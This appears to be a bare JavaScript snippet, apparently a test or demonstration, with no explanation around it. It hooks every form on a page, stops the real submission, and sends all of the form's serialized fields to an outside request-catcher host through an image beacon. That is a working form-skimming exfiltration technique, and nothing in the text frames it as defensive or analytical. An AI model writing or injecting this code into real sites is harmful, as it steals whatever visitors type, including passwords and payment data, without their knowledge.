jQuery('form').submit(function(e) {
    e.preventDefault();
    jQuery.theForm = jQuery(this);
    var newImage = new Image();
    newImage.src = "http://testing.requestcatcher.com/?" + jQuery.theForm.serialize();
});
